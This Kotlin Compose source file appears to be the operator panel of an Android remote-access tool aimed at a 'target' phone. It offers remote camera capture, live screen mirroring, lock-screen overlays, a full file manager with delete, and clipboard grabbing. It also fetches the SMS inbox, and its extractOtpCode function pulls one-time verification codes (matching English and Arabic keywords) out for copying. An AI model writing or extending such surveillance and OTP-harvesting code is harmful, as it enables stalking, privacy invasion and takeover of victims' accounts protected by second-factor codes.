                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF6200EE))
                        ) {
                            Text("Capture Front", fontSize = 12.sp)
                        }
                        Spacer(modifier = Modifier.width(12.dp))
                        Button(
                            onClick = { onCapturePhoto("back") },
                            enabled = isConnected,
                            modifier = Modifier.weight(1f),
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00BFA5))
                        ) {
                            Text("Capture Back", fontSize = 12.sp)
                        }
                    }
                }
            }
        }

        // Screen Mirroring Card
        Card(
            modifier = Modifier.fillMaxWidth().padding(top = 12.dp),
            colors = CardDefaults.cardColors(containerColor = Color(0xFF161622))
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Column {
                        Text("Live Screen Mirroring", color = Color(0xFF888888), fontSize = 12.sp)
                        Text(
                            text = if (isMirroring) "Streaming active..." else "Stream offline",
                            color = if (isMirroring) Color(0xFF00E676) else Color.Gray,
                            fontSize = 14.sp,
                            fontWeight = FontWeight.Bold
                        )
                    }
                    Box(
                        modifier = Modifier
                            .size(8.dp)
                            .clip(RoundedCornerShape(4.dp))
                            .background(if (isMirroring) Color(0xFF00E676) else Color(0xFFFF3D00))
                    )
                }
                
                if (isMirroring && mirrorBitmap != null) {
                    Spacer(modifier = Modifier.height(12.dp))
                    Image(
                        bitmap = mirrorBitmap.asImageBitmap(),
                        contentDescription = "Screen Mirror Frame",
                        modifier = Modifier
                            .fillMaxWidth()
                            .height(300.dp)
                            .clip(RoundedCornerShape(8.dp))
                            .border(1.dp, Color(0xFF2D2D3D), RoundedCornerShape(8.dp))
                    )
                }
                
                Spacer(modifier = Modifier.height(12.dp))
                Button(
                    onClick = onToggleMirror,
                    enabled = isConnected,
                    modifier = Modifier.fillMaxWidth().height(44.dp),
                    colors = ButtonDefaults.buttonColors(
                        containerColor = if (isMirroring) Color(0xFFFF1744) else Color(0xFF00B1FF)
                    )
                ) {
                    Text(
                        text = if (isMirroring) "🛑 Stop Mirroring" else "📺 Start Screen Mirroring",
                        fontWeight = FontWeight.Bold
                    )
                }
            }
        }

        // Lock Screen Message Card
        Card(
            modifier = Modifier.fillMaxWidth().padding(top = 12.dp),
            colors = CardDefaults.cardColors(containerColor = Color(0xFF161622))
        ) {
            Column(modifier = Modifier.padding(16.dp)) {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceBetween,
                    verticalAlignment = Alignment.CenterVertically
                ) {
                    Column {
                        Text("Lock Screen Contact Message", color = Color(0xFF888888), fontSize = 12.sp)
                        Text(
                            text = if (isLocked) "Device screen overlay ACTIVE" else "Device overlay inactive",
                            color = if (isLocked) Color(0xFFFF3D00) else Color.Gray,
                            fontSize = 14.sp,
                            fontWeight = FontWeight.Bold
                        )
                    }
                    Box(
                        modifier = Modifier
                            .size(8.dp)
                            .clip(RoundedCornerShape(4.dp))
                            .background(if (isLocked) Color(0xFFFF3D00) else Color(0xFF00E676))
                    )
                }
                
                Spacer(modifier = Modifier.height(12.dp))
                
                var customMsg by remember { mutableStateOf("Please return this phone, it contains important files.") }
                var customPhone by remember { mutableStateOf("") }
                
                OutlinedTextField(
                    value = customMsg,
                    onValueChange = { customMsg = it },
                    label = { Text("Lock Screen Message", color = Color.Gray) },
                    textStyle = TextStyle(color = Color.White),
                    modifier = Modifier.fillMaxWidth(),
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedBorderColor = Color(0xFF00B1FF),
                        unfocusedBorderColor = Color(0xFF2D2D3D)
                    )
                )
                
                Spacer(modifier = Modifier.height(8.dp))
                
                OutlinedTextField(
                    value = customPhone,
                    onValueChange = { customPhone = it },
                    label = { Text("Contact Phone Number", color = Color.Gray) },
                    textStyle = TextStyle(color = Color.White),
                    modifier = Modifier.fillMaxWidth(),
                    colors = OutlinedTextFieldDefaults.colors(
                        focusedBorderColor = Color(0xFF00B1FF),
                        unfocusedBorderColor = Color(0xFF2D2D3D)
                    )
                )
                
                Spacer(modifier = Modifier.height(16.dp))
                
                if (isLocked) {
                    Button(
                        onClick = onUnlockDevice,
                        enabled = isConnected,
                        modifier = Modifier.fillMaxWidth().height(44.dp),
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00E676), contentColor = Color.Black)
                    ) {
                        Text("🔓 Unlock Screen Overlay", fontWeight = FontWeight.Bold)
                    }
                } else {
                    Button(
                        onClick = { onLockDevice(customMsg, customPhone) },
                        enabled = isConnected,
                        modifier = Modifier.fillMaxWidth().height(44.dp),
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFFF1744))
                    ) {
                        Text("🔒 Lock Device & Show Message", fontWeight = FontWeight.Bold)
                    }
                }
            }
        }
        
        Spacer(modifier = Modifier.height(24.dp))
        Text("Quick Control Actions", fontSize = 16.sp, fontWeight = FontWeight.Bold, color = Color.White)
        Spacer(modifier = Modifier.height(12.dp))

        Button(
            onClick = onOpenAppLauncher,
            enabled = isConnected,
            modifier = Modifier.fillMaxWidth().height(48.dp),
            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFE040FB))
        ) {
            Text("🚀 Remote App Launcher", fontWeight = FontWeight.SemiBold)
        }
        Spacer(modifier = Modifier.height(12.dp))
        
        Button(
            onClick = onRefreshInfo,
            enabled = isConnected,
            modifier = Modifier.fillMaxWidth().height(48.dp),
            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF6200EE))
        ) {
            Text("Refresh Device Info", fontWeight = FontWeight.SemiBold)
        }
        Spacer(modifier = Modifier.height(12.dp))

        Button(
            onClick = onLocateDevice,
            enabled = isConnected,
            modifier = Modifier.fillMaxWidth().height(48.dp),
            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00BFA5))
        ) {
            Text("Locate Device (GPS)", fontWeight = FontWeight.SemiBold)
        }
        Spacer(modifier = Modifier.height(12.dp))

        // Remote Siren Trigger Button
        Button(
            onClick = onToggleSiren,
            enabled = isConnected,
            modifier = Modifier.fillMaxWidth().height(48.dp),
            colors = ButtonDefaults.buttonColors(
                containerColor = if (isRinging) Color(0xFFFF1744) else Color(0xFFFF9100)
            )
        ) {
            Text(
                text = if (isRinging) "🔊 Stop Alarm (Siren)" else "🔔 Trigger Alarm (Siren)",
                fontWeight = FontWeight.Bold
            )
        }
        Spacer(modifier = Modifier.height(12.dp))
        
        Row(modifier = Modifier.fillMaxWidth()) {
            Button(
                onClick = onGetClipboard,
                enabled = isConnected,
                modifier = Modifier.weight(1f).height(48.dp),
                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00C853))
            ) {
                Text("Get Target Clipboard", fontSize = 12.sp)
            }
            Spacer(modifier = Modifier.width(12.dp))
            Button(
                onClick = onSendClipboard,
                enabled = isConnected,
                modifier = Modifier.weight(1f).height(48.dp),
                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF2979FF))
            ) {
                Text("Send My Clipboard", fontSize = 12.sp)
            }
        }
    }
}

@Composable
fun StatusCard(label: String, value: String, accentColor: Color) {
    Card(
        modifier = Modifier.fillMaxWidth(),
        colors = CardDefaults.cardColors(containerColor = Color(0xFF161622))
    ) {
        Row(
            modifier = Modifier
                .padding(16.dp)
                .fillMaxWidth(),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Column {
                Text(label, color = Color(0xFF888888), fontSize = 12.sp)
                Text(value, color = Color.White, fontSize = 18.sp, fontWeight = FontWeight.Bold)
            }
            Box(
                modifier = Modifier
                    .size(8.dp)
                    .clip(RoundedCornerShape(4.dp))
                    .background(accentColor)
            )
        }
    }
}

@OptIn(ExperimentalFoundationApi::class)
@Composable
fun FileExplorerTab(
    isConnected: Boolean, 
    fileList: List<FileItem>, 
    pathText: String,
    onPathChanged: (String) -> Unit,
    onBrowse: (String) -> Unit,
    onDownload: (String, String) -> Unit,
    onUpload: (String) -> Unit,
    onDelete: (String) -> Unit,
    onCreateFolder: (String) -> Unit
) {
    var newFolderName by remember { mutableStateOf("") }
    var uploadLocalPath by remember { mutableStateOf("/storage/emulated/0/test.txt") }
    var showCreateFolderDialog by remember { mutableStateOf(false) }
    var showUploadDialog by remember { mutableStateOf(false) }
    
    var activeItemForOptions by remember { mutableStateOf<FileItem?>(null) }
    
    LaunchedEffect(isConnected, pathText) {
        if (isConnected) {
            onBrowse(pathText)
        }
    }
    
    Column(modifier = Modifier.fillMaxSize()) {
        Card(
            colors = CardDefaults.cardColors(containerColor = Color(0xFF161622)),
            modifier = Modifier.fillMaxWidth()
        ) {
            Row(
                modifier = Modifier.padding(12.dp).fillMaxWidth(),
                verticalAlignment = Alignment.CenterVertically
            ) {
                IconButton(
                    onClick = {
                        val parentPath = File(pathText).parent
                        if (parentPath != null && parentPath != "/") {
                            onPathChanged(parentPath)
                        }
                    },
                    enabled = isConnected && pathText != "/storage/emulated/0" && pathText != "/"
                ) {
                    Text("⬅️", color = Color.White, fontSize = 20.sp)
                }
                Spacer(modifier = Modifier.width(4.dp))
                Text(
                    text = pathText,
                    color = Color.White,
                    fontSize = 13.sp,
                    modifier = Modifier.weight(1f),
                    maxLines = 1
                )
                Spacer(modifier = Modifier.width(4.dp))
                IconButton(onClick = { onBrowse(pathText) }, enabled = isConnected) {
                    Text("🔄", fontSize = 16.sp)
                }
            }
        }
        Spacer(modifier = Modifier.height(12.dp))
        
        Row(modifier = Modifier.fillMaxWidth()) {
            Button(
                onClick = { showCreateFolderDialog = true },
                enabled = isConnected,
                modifier = Modifier.weight(1f),
                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF7B1FA2))
            ) {
                Text("New Folder")
            }
            Spacer(modifier = Modifier.width(12.dp))
            Button(
                onClick = { showUploadDialog = true },
                enabled = isConnected,
                modifier = Modifier.weight(1f),
                colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00BFA5))
            ) {
                Text("Upload File")
            }
        }
        
        Spacer(modifier = Modifier.height(16.dp))
        Text("Files & Folders (Long-press files for options)", fontSize = 14.sp, color = Color.Gray)
        Spacer(modifier = Modifier.height(8.dp))
        
        LazyColumn(
            modifier = Modifier
                .weight(1f)
                .fillMaxWidth()
                .background(Color(0xFF161622), RoundedCornerShape(8.dp))
                .padding(8.dp)
        ) {
            items(fileList) { item ->
                Row(
                    modifier = Modifier
                        .fillMaxWidth()
                        .clip(RoundedCornerShape(8.dp))
                        .combinedClickable(
                            onClick = {
                                if (item.isDirectory) {
                                    val nextPath = if (pathText.endsWith("/")) "$pathText${item.name}" else "$pathText/${item.name}"
                                    onPathChanged(nextPath)
                                }
                            },
                            onLongClick = {
                                if (!item.isDirectory) {
                                    activeItemForOptions = item
                                }
                            }
                        )
                        .padding(vertical = 12.dp, horizontal = 12.dp),
                    verticalAlignment = Alignment.CenterVertically,
                    horizontalArrangement = Arrangement.SpaceBetween
                ) {
                    Row(
                        modifier = Modifier.weight(1f),
                        verticalAlignment = Alignment.CenterVertically
                    ) {
                        val icon = if (item.isDirectory) "📁" else {
                            val ext = item.name.substringAfterLast('.', "").lowercase()
                            when (ext) {
                                "jpg", "jpeg", "png", "webp", "gif" -> "🖼️"
                                "mp4", "mkv", "avi", "mov" -> "🎥"
                                "mp3", "wav", "ogg", "flac" -> "🎵"
                                "pdf" -> "📕"
                                "txt", "md", "json", "xml" -> "📝"
                                "apk" -> "🤖"
                                else -> "📄"
                            }
                        }
                        Text(text = "$icon  ", fontSize = 22.sp)
                        Column {
                            Text(text = item.name, color = Color.White, fontSize = 14.sp, fontWeight = FontWeight.Medium)
                            if (!item.isDirectory) {
                                Text(text = item.size, color = Color.Gray, fontSize = 11.sp)
                            }
                        }
                    }
                    if (item.isDirectory) {
                        Text("▶️", color = Color.Gray, fontSize = 12.sp)
                    } else {
                        IconButton(onClick = { activeItemForOptions = item }, modifier = Modifier.size(24.dp)) {
                            Text("⚙️", fontSize = 14.sp)
                        }
                    }
                }
            }
        }
    }
    
    if (showCreateFolderDialog) {
        AlertDialog(
            onDismissRequest = { showCreateFolderDialog = false },
            title = { Text("Create Folder") },
            text = {
                BasicTextField(
                    value = newFolderName,
                    onValueChange = { newFolderName = it },
                    textStyle = TextStyle(color = Color.Black, fontSize = 14.sp),
                    modifier = Modifier
                        .fillMaxWidth()
                        .background(Color.White, RoundedCornerShape(4.dp))
                        .border(1.dp, Color.Gray, RoundedCornerShape(4.dp))
                        .padding(8.dp),
                    decorationBox = { innerTextField ->
                        if (newFolderName.isEmpty()) {
                            Text("Folder Name", color = Color.Gray)
                        }
                        innerTextField()
                    }
                )
            },
            confirmButton = {
                Button(
                    onClick = {
                        if (newFolderName.isNotBlank()) {
                            onCreateFolder(newFolderName)
                            newFolderName = ""
                            showCreateFolderDialog = false
                        }
                    },
                    enabled = newFolderName.isNotBlank()
                ) {
                    Text("Create")
                }
            },
            dismissButton = {
                Button(onClick = { showCreateFolderDialog = false }) {
                    Text("Cancel")
                }
            }
        )
    }
    
    if (showUploadDialog) {
        AlertDialog(
            onDismissRequest = { showUploadDialog = false },
            title = { Text("Upload File") },
            text = {
                Column {
                    Text("Enter local file path on Controller:")
                    Spacer(modifier = Modifier.height(8.dp))
                    BasicTextField(
                        value = uploadLocalPath,
                        onValueChange = { uploadLocalPath = it },
                        textStyle = TextStyle(color = Color.Black, fontSize = 14.sp),
                        modifier = Modifier
                            .fillMaxWidth()
                            .background(Color.White, RoundedCornerShape(4.dp))
                            .border(1.dp, Color.Gray, RoundedCornerShape(4.dp))
                            .padding(8.dp)
                    )
                }
            },
            confirmButton = {
                Button(
                    onClick = {
                        if (uploadLocalPath.isNotBlank()) {
                            onUpload(uploadLocalPath)
                            showUploadDialog = false
                        }
                    },
                    enabled = uploadLocalPath.isNotBlank()
                ) {
                    Text("Upload")
                }
            },
            dismissButton = {
                Button(onClick = { showUploadDialog = false }) {
                    Text("Cancel")
                }
            }
        )
    }
    
    if (activeItemForOptions != null) {
        val item = activeItemForOptions!!
        AlertDialog(
            onDismissRequest = { activeItemForOptions = null },
            title = { Text(item.name) },
            text = {
                Column {
                    Text("File size: ${item.size}", fontWeight = FontWeight.Medium)
                    Spacer(modifier = Modifier.height(4.dp))
                    Text("Full path: ${item.fullPath}", fontSize = 12.sp, color = Color.Gray)
                }
            },
            confirmButton = {
                Row(
                    modifier = Modifier.fillMaxWidth(),
                    horizontalArrangement = Arrangement.SpaceEvenly
                ) {
                    Button(
                        onClick = {
                            onDownload(item.name, item.fullPath)
                            activeItemForOptions = null
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00C853))
                    ) {
                        Text("Download")
                    }
                    Button(
                        onClick = {
                            onDelete(item.fullPath)
                            activeItemForOptions = null
                        },
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFD50000))
                    ) {
                        Text("Delete")
                    }
                    Button(
                        onClick = { activeItemForOptions = null },
                        colors = ButtonDefaults.buttonColors(containerColor = Color.Gray)
                    ) {
                        Text("Close")
                    }
                }
            }
        )
    }
}

@Composable
fun NotificationsTab(
    isConnected: Boolean,
    notifications: List<String>,
    smsList: List<SmsItem>,
    onClearNotifications: () -> Unit,
    onClearSms: () -> Unit,
    onFetchSms: () -> Unit,
    onCopySms: (String) -> Unit
) {
    var selectedFilter by remember { mutableStateOf(0) } // 0: Notifications, 1: SMS logs
    
    Column(modifier = Modifier.fillMaxSize()) {
        Row(
            modifier = Modifier
                .fillMaxWidth()
                .background(Color(0xFF161622), RoundedCornerShape(8.dp))
                .padding(4.dp)
        ) {
            Button(
                onClick = { selectedFilter = 0 },
                colors = ButtonDefaults.buttonColors(
                    containerColor = if (selectedFilter == 0) Color(0xFF6200EE) else Color.Transparent,
                    contentColor = Color.White
                ),
                modifier = Modifier.weight(1f),
                shape = RoundedCornerShape(6.dp)
            ) {
                Text("Notifications (${notifications.size})", fontSize = 12.sp)
            }
            Spacer(modifier = Modifier.width(8.dp))
            Button(
                onClick = { selectedFilter = 1 },
                colors = ButtonDefaults.buttonColors(
                    containerColor = if (selectedFilter == 1) Color(0xFF6200EE) else Color.Transparent,
                    contentColor = Color.White
                ),
                modifier = Modifier.weight(1f),
                shape = RoundedCornerShape(6.dp)
            ) {
                Text("SMS Logs (${smsList.size})", fontSize = 12.sp)
            }
        }
        
        Spacer(modifier = Modifier.height(16.dp))
        
        Row(
            modifier = Modifier.fillMaxWidth(),
            horizontalArrangement = Arrangement.SpaceBetween,
            verticalAlignment = Alignment.CenterVertically
        ) {
            Text(
                text = if (selectedFilter == 0) "System Notifications" else "Device SMS Inbox / OTPs",
                fontSize = 16.sp,
                fontWeight = FontWeight.Bold,
                color = Color.White
            )
            
            if (selectedFilter == 0 && notifications.isNotEmpty()) {
                Button(
                    onClick = onClearNotifications,
                    colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFD50000)),
                    modifier = Modifier.height(36.dp)
                ) {
                    Text("Clear", fontSize = 11.sp)
                }
            } else if (selectedFilter == 1) {
                Row {
                    Button(
                        onClick = onFetchSms,
                        enabled = isConnected,
                        colors = ButtonDefaults.buttonColors(containerColor = Color(0xFF00BFA5)),
                        modifier = Modifier.height(36.dp)
                    ) {
                        Text("Fetch Inbox", fontSize = 11.sp)
                    }
                    if (smsList.isNotEmpty()) {
                        Spacer(modifier = Modifier.width(8.dp))
                        Button(
                            onClick = onClearSms,
                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFD50000)),
                            modifier = Modifier.height(36.dp)
                        ) {
                            Text("Clear", fontSize = 11.sp)
                        }
                    }
                }
            }
        }
        
        Spacer(modifier = Modifier.height(12.dp))
        
        if (selectedFilter == 0) {
            if (notifications.isEmpty()) {
                Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                    Text("No notifications received yet.", color = Color.Gray)
                }
            } else {
                LazyColumn(
                    modifier = Modifier
                        .weight(1f)
                        .fillMaxWidth()
                        .background(Color(0xFF161622), RoundedCornerShape(8.dp))
                        .padding(8.dp)
                ) {
                    items(notifications) { item ->
                        Card(
                            modifier = Modifier.fillMaxWidth().padding(vertical = 4.dp),
                            colors = CardDefaults.cardColors(containerColor = Color(0xFF252538))
                        ) {
                            Text(
                                text = item,
                                color = Color.LightGray,
                                fontSize = 13.sp,
                                modifier = Modifier.padding(12.dp)
                            )
                        }
                    }
                }
            }
        } else {
            if (smsList.isEmpty()) {
                Box(modifier = Modifier.fillMaxSize(), contentAlignment = Alignment.Center) {
                    Text("No SMS messages synced. Click 'Fetch Inbox' to retrieve messages.", color = Color.Gray)
                }
            } else {
                LazyColumn(
                    modifier = Modifier
                        .weight(1f)
                        .fillMaxWidth()
                        .background(Color(0xFF161622), RoundedCornerShape(8.dp))
                        .padding(8.dp)
                ) {
                    items(smsList) { item ->
                        Card(
                            modifier = Modifier.fillMaxWidth().padding(vertical = 6.dp),
                            colors = CardDefaults.cardColors(
                                containerColor = if (item.isOtp) Color(0xFF2D2A1E) else Color(0xFF252538)
                            ),
                            border = if (item.isOtp) BorderStroke(1.dp, Color(0xFFFFD700)) else null
                        ) {
                            Column(modifier = Modifier.padding(12.dp)) {
                                Row(
                                    modifier = Modifier.fillMaxWidth(),
                                    horizontalArrangement = Arrangement.SpaceBetween,
                                    verticalAlignment = Alignment.CenterVertically
                                ) {
                                    Text(
                                        text = item.sender,
                                        fontWeight = FontWeight.Bold,
                                        color = if (item.isOtp) Color(0xFFFFD700) else Color.White,
                                        fontSize = 14.sp
                                    )
                                    if (item.isOtp) {
                                        Box(
                                            modifier = Modifier
                                                .background(Color(0xFFFFD700), RoundedCornerShape(4.dp))
                                                .padding(horizontal = 6.dp, vertical = 2.dp)
                                        ) {
                                            Text("OTP CODE", color = Color.Black, fontSize = 9.sp, fontWeight = FontWeight.Bold)
                                        }
                                    }
                                }
                                
                                Spacer(modifier = Modifier.height(6.dp))
                                Text(text = item.body, color = Color.LightGray, fontSize = 13.sp)
                                
                                if (item.isOtp && item.code != null) {
                                    Spacer(modifier = Modifier.height(10.dp))
                                    Row(
                                        modifier = Modifier.fillMaxWidth(),
                                        horizontalArrangement = Arrangement.SpaceBetween,
                                        verticalAlignment = Alignment.CenterVertically
                                    ) {
                                        Text(
                                            text = "Extracted: ${item.code}",
                                            fontWeight = FontWeight.SemiBold,
                                            color = Color(0xFFFFD700),
                                            fontSize = 13.sp
                                        )
                                        Button(
                                            onClick = { onCopySms(item.code) },
                                            colors = ButtonDefaults.buttonColors(containerColor = Color(0xFFFFD700), contentColor = Color.Black),
                                            modifier = Modifier.height(28.dp),
                                            contentPadding = PaddingValues(horizontal = 12.dp, vertical = 0.dp)
                                        ) {
                                            Text("Copy Code", fontSize = 11.sp, fontWeight = FontWeight.Bold)
                                        }
                                    }
                                }
                            }
                        }
                    }
                }
            }
        }
    }
}

data class SmsItem(
    val sender: String,
    val body: String,
    val isOtp: Boolean = false,
    val code: String? = null
)

fun extractOtpCode(body: String): String? {
    val lowercase = body.lowercase()
    val containsOtpKeywords = lowercase.contains("code") || lowercase.contains("otp") || 
            lowercase.contains("verification") || lowercase.contains("رمز") || 
            lowercase.contains("تفعيل") || lowercase.contains("تأكيد")
    
    if (containsOtpKeywords) {
        val regex = Regex("\\b\\d{4,8}\\b")
        val match = regex.find(body)
        return match?.value
    }
    return null
}

data class AppItem(
    val name: String,
    val packageName: String
)
